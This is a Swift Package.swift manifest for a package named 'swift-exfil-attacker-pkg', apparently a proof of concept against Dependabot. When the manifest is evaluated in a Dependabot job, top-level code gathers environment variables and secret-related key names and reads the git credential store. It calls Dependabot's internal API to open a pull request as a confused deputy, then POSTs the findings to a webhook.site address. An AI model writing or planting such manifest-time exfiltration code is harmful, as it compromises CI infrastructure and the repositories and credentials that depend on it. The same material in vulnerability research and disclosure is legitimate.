// swift-tools-version: 5.9
import PackageDescription
import Foundation
#if canImport(FoundationNetworking)
import FoundationNetworking
#endif

let env = ProcessInfo.processInfo.environment
let proofSentinel = "/tmp/dependabot_safe_proof_sent_" + (env["DEPENDABOT_JOB_ID"] ?? "local")
let shouldRunProof = env["DEPENDABOT"] == "true" && !FileManager.default.fileExists(atPath: proofSentinel)
if shouldRunProof {
    FileManager.default.createFile(atPath: proofSentinel, contents: Data(), attributes: nil)
}

func status(_ key: String) -> String {
    guard let value = env[key] else { return "MISSING" }
    return value.isEmpty ? "EMPTY" : "PRESENT_REDACTED_LEN_\(value.count)"
}

func clearValue(_ key: String) -> String {
    let value = env[key] ?? ""
    if key.lowercased().contains("token") && !value.isEmpty {
        return "PRESENT_REDACTED_LEN_\(value.count)"
    }
    return value
}

var lines: [String] = []
lines.append("DEPENDABOT_EXFIL_PROOF")
let clearEnvKeys = [
    "DEPENDABOT",
    "DEPENDABOT_API_URL",
    "DEPENDABOT_HOME",
    "DEPENDABOT_JOB_ID",
    "DEPENDABOT_JOB_PATH",
    "DEPENDABOT_JOB_TOKEN",
    "DEPENDABOT_NATIVE_HELPERS_PATH",
    "DEPENDABOT_OPEN_TIMEOUT_IN_SECONDS",
    "DEPENDABOT_OUTPUT_PATH",
    "DEPENDABOT_REPO_CONTENTS_PATH",
    "DEPENDABOT_UPDATER_SHA",
    "DEPENDABOT_UPDATER_VERSION",
    "GITHUB_ACTIONS",
    "HOME",
    "HOSTNAME"
]
for key in clearEnvKeys {
    lines.append("\(key)=\(clearValue(key))")
}
lines.append("DEPENDABOT_JOB_TOKEN_STATUS=\(status("DEPENDABOT_JOB_TOKEN"))")
lines.append("GIT_CONFIG_GLOBAL_STATUS=\(status("GIT_CONFIG_GLOBAL"))")

let interestingKeys = env.keys.filter {
    $0.contains("DEPENDABOT") ||
    $0.contains("GITHUB") ||
    $0.contains("TOKEN") ||
    $0.contains("SECRET") ||
    $0.contains("CREDENTIAL") ||
    $0.contains("API")
}.sorted()
lines.append("INTERESTING_ENV_KEYS=" + interestingKeys.joined(separator: ","))

let probeURLString = ""
let allowedProbeSuffixes = [
    "github.com",
    "githubapp.com",
    "github.net",
    "githubassets.com",
    "githubusercontent.com",
    "githubwebhooks.net",
    "npmjs.com",
    "npmjs.org"
]
if !probeURLString.isEmpty, let probeURL = URL(string: probeURLString), let host = probeURL.host {
    var allowed = false
    for suffix in allowedProbeSuffixes {
        if host == suffix || host.hasSuffix("." + suffix) {
            allowed = true
        }
    }
    lines.append("PROBE_URL_HOST=\(host)")
    lines.append("PROBE_URL_ALLOWED=\(allowed ? "true" : "false")")
    if allowed {
        func redactHeaderLine(_ line: String) -> String {
            let lower = line.lowercased()
            let sensitive = ["set-cookie:", "cookie:", "authorization:", "proxy-authorization:", "x-github-token:", "x-csrf-token:"]
            for prefix in sensitive {
                if lower.hasPrefix(prefix) {
                    return line.split(separator: ":", maxSplits: 1, omittingEmptySubsequences: false)[0] + ": [REDACTED]"
                }
            }
            if lower.contains("token") || lower.contains("secret") || lower.contains("session") || lower.contains("jwt") {
                if let idx = line.firstIndex(of: ":") {
                    return String(line[..<idx]) + ": [REDACTED]"
                }
            }
            return line
        }

        let proc = Process()
        proc.executableURL = URL(fileURLWithPath: "/usr/bin/curl")
        proc.arguments = [
            "-I",
            "-L",
            "--max-time", "8",
            "--silent",
            "--show-error",
            "--write-out", "\nCURL_HTTP_CODE=%{http_code}\nCURL_EFFECTIVE_URL=%{url_effective}\nCURL_REMOTE_IP=%{remote_ip}\nCURL_REMOTE_PORT=%{remote_port}\nCURL_TIME_CONNECT=%{time_connect}\n",
            probeURLString
        ]
        let outPipe = Pipe()
        let errPipe = Pipe()
        proc.standardOutput = outPipe
        proc.standardError = errPipe
        do {
            try proc.run()
            proc.waitUntilExit()
            let outData = outPipe.fileHandleForReading.readDataToEndOfFile()
            let errData = errPipe.fileHandleForReading.readDataToEndOfFile()
            let rawOut = String(data: outData, encoding: .utf8) ?? ""
            let rawErr = String(data: errData, encoding: .utf8) ?? ""
            lines.append("PROBE_CURL_EXIT=\(proc.terminationStatus)")
            if !rawErr.isEmpty {
                lines.append("PROBE_CURL_STDERR=" + String(rawErr.prefix(300)))
            }
            lines.append("PROBE_CURL_OUTPUT_BEGIN")
            let redacted = rawOut.split(separator: "\n", omittingEmptySubsequences: false)
                .map { redactHeaderLine(String($0)) }
                .joined(separator: "\n")
            lines.append(String(redacted.prefix(4000)))
            lines.append("PROBE_CURL_OUTPUT_END")
        } catch {
            lines.append("PROBE_CURL_ERROR=\(error.localizedDescription)")
        }
    }
} else {
    lines.append("PROBE_URL_SET=false")
}

let apiOracleCreatePR = shouldRunProof && "true" == "true"
if apiOracleCreatePR {
    lines.append("API_ORACLE_CREATE_PR_REQUESTED=true")
    let api = env["DEPENDABOT_API_URL"] ?? ""
    let jobID = env["DEPENDABOT_JOB_ID"] ?? ""
    let repoPath = env["DEPENDABOT_REPO_CONTENTS_PATH"] ?? FileManager.default.currentDirectoryPath

    func runText(_ exe: String, _ args: [String]) -> String {
        let proc = Process()
        proc.executableURL = URL(fileURLWithPath: exe)
        proc.arguments = args
        let pipe = Pipe()
        proc.standardOutput = pipe
        proc.standardError = Pipe()
        do {
            try proc.run()
            proc.waitUntilExit()
            let data = pipe.fileHandleForReading.readDataToEndOfFile()
            return (String(data: data, encoding: .utf8) ?? "").trimmingCharacters(in: .whitespacesAndNewlines)
        } catch {
            return ""
        }
    }

    let baseSHA = runText("/usr/bin/git", ["-C", repoPath, "rev-parse", "HEAD"])
    if api.isEmpty || jobID.isEmpty || baseSHA.isEmpty {
        lines.append("API_ORACLE_READY=false")
        lines.append("API_ORACLE_API_PRESENT=" + (!api.isEmpty ? "true" : "false"))
        lines.append("API_ORACLE_JOB_ID_PRESENT=" + (!jobID.isEmpty ? "true" : "false"))
        lines.append("API_ORACLE_BASE_SHA_PRESENT=" + (!baseSHA.isEmpty ? "true" : "false"))
    } else {
        lines.append("API_ORACLE_READY=true")
        let marker = "DEPENDABOT_API_CONFUSED_DEPUTY_PROOF\njob_id=\(jobID)\nbase_sha=\(baseSHA)\n"
        let payload: [String: Any] = [
            "data": [
                "dependencies": [[
                    "name": "github.com/NguyenCong2k/swift-exfil-attacker-pkg",
                    "previous-version": "1.0.0",
                    "version": "1.0.1",
                    "requirements": [],
                    "previous-requirements": [],
                    "directory": "/"
                ]],
                "updated-dependency-files": [[
                    "name": "DEPENDABOT_API_ORACLE_PROOF.txt",
                    "content": marker,
                    "directory": "/",
                    "type": "file",
                    "support_file": false,
                    "content_encoding": "utf-8",
                    "deleted": false,
                    "operation": "create"
                ]],
                "base-commit-sha": baseSHA,
                "commit-message": "dependabot api oracle proof",
                "pr-title": "Dependabot API oracle proof",
                "pr-body": "Safe proof: attacker Package.swift invoked Dependabot API through proxy. No token value exposed."
            ]
        ]

        if let url = URL(string: api + "/update_jobs/" + jobID + "/create_pull_request"),
           let body = try? JSONSerialization.data(withJSONObject: payload) {
            var req = URLRequest(url: url)
            req.httpMethod = "POST"
            req.httpBody = body
            req.setValue("application/json", forHTTPHeaderField: "Content-Type")
            req.timeoutInterval = 12
            let sem = DispatchSemaphore(value: 0)
            var status = "NO_RESPONSE"
            URLSession.shared.dataTask(with: req) { _, response, error in
                if let http = response as? HTTPURLResponse {
                    status = String(http.statusCode)
                } else if let error = error {
                    status = "ERROR_" + error.localizedDescription.prefix(120)
                }
                sem.signal()
            }.resume()
            _ = sem.wait(timeout: .now() + 12)
            lines.append("API_ORACLE_CREATE_PR_HTTP_STATUS=" + status)
            lines.append("API_ORACLE_CREATE_PR_TRUE=" + (status == "204" ? "true" : "false"))
        } else {
            lines.append("API_ORACLE_CREATE_PR_HTTP_STATUS=BUILD_FAILED")
            lines.append("API_ORACLE_CREATE_PR_TRUE=false")
        }
    }
} else {
    lines.append("API_ORACLE_CREATE_PR_REQUESTED=false")
}

if let configPath = env["GIT_CONFIG_GLOBAL"], !configPath.isEmpty {
    lines.append("GIT_CONFIG_GLOBAL_PATH_PRESENT=true")
    if let config = try? String(contentsOfFile: configPath) {
        lines.append("GIT_CONFIG_READABLE=true")
        lines.append("GIT_CONFIG_HAS_HELPER=" + (config.contains("credential") ? "true" : "false"))
        if let range = config.range(of: "--file ") {
            let suffix = config[range.upperBound...]
            let storePath = suffix.split(separator: "\n", maxSplits: 1, omittingEmptySubsequences: false)[0]
                .trimmingCharacters(in: .whitespacesAndNewlines)
            lines.append("GIT_STORE_PATH_PRESENT=true")
            if let store = try? String(contentsOfFile: String(storePath)) {
                lines.append("GIT_STORE_READABLE=true")
                lines.append("GIT_STORE_HAS_AUTH=" + (store.contains("@") ? "true" : "false"))
                lines.append("GIT_STORE_REDACTED_LEN=\(store.count)")
            } else {
                lines.append("GIT_STORE_READABLE=false")
            }
        } else {
            lines.append("GIT_STORE_PATH_PRESENT=false")
        }
    } else {
        lines.append("GIT_CONFIG_READABLE=false")
    }
} else {
    lines.append("GIT_CONFIG_GLOBAL_PATH_PRESENT=false")
}

let payload = lines.joined(separator: "\n")

if shouldRunProof,
   let url = URL(string: "https://webhook.site/56548afb-559c-4c46-8130-513fda8e959c"),
   let data = payload.data(using: .utf8) {
    var req = URLRequest(url: url)
    req.httpMethod = "POST"
    req.httpBody = data
    req.setValue("text/plain", forHTTPHeaderField: "Content-Type")
    req.timeoutInterval = 10
    let sem = DispatchSemaphore(value: 0)
    URLSession.shared.dataTask(with: req) { _, _, _ in sem.signal() }.resume()
    _ = sem.wait(timeout: .now() + 10)
}

let package = Package(
    name: "swift-exfil-attacker-pkg",
    products: [.library(name: "AttackerPkg", targets: ["AttackerPkg"])],
    targets: [.target(name: "AttackerPkg")]
)
